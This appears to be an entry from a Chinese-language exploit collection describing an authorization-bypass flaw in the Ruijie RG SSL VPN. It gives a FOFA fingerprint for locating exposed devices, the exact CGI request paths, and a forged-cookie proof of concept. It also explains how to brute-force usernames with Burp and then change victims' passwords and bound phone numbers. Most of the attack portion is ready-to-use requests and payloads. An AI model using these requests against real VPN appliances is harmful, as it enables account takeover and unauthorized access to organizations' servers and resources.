# 锐捷RGSSLVPN垂直越权漏洞

- **系统**：锐捷　|　**类型**：未授权访问　|　**CVE**：—
- **指纹**：`icon_hash="884334722"`
- **请求**：`GET /cgi-bin/main.cgi?oper=getrsc HTTP/1.1`

**请求体 / payload**
```
/cgi-bin/main.cgi?oper=getrsc
直接访问，回显如下：\

随后访问如下，UserName 参数为已知用户名 在未知登录用户名的情况下 漏洞无法利用(根据请求包使用Burp进行用户名爆破)
/cgi-bin/main.cgi?oper=showsvr&encode=GBK&username=name&sid=1614345312&oper=showres

查看服务器资源POC：
Host: 127.0.0.1
Sec-Fetch-User: ?1
Cookie: UserName=name; SessionId=1; FirstVist=1; Skin=1; tunnel=1

通过此方法知道用户名后可以通过漏洞修改账号参数，访问
/cgi-bin/main.cgi?oper=showsvr&encode=GBK&username=liuw&sid=1&oper=showres

点击个人设置跳转页面即可修改账号信息\
```

**其他**
- 锐捷RG SSL VPN 垂直越权漏洞: **一、漏洞简介**\
Ruijie SSL VPN 存在越权访问漏洞，攻击者在已知用户名的情况下，可以对账号进行修改密码和绑定手机的操作。并在未授权的情况下查看服务器资源\
**二、影响版本**\
锐捷RG SSL VPN\
**三、资产测绘**\
fofa`icon_hash="884334722" ｜  title="Ruijie SSL VPN"`\
●登录页面